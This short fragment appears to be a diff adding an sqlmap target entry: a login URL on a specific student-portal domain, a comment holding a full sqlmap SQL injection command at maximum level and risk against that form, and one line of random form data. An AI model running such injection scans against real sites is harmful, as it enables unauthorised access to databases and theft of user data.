@@ -1,0 +1,3 @@
+https://student.pir0g.ru/login (POST)  # C:\Users\adomr\AppData\Local\Programs\Python\Python312\Scripts\sqlmap -u https://student.pir0g.ru/login --batch --level 5 --risk 3 --random-agent --output-dir sqlmap_results --flush-session --timeout 30 --data username=admin&password=admin --forms
+
+email=WkUs&password=XDOv
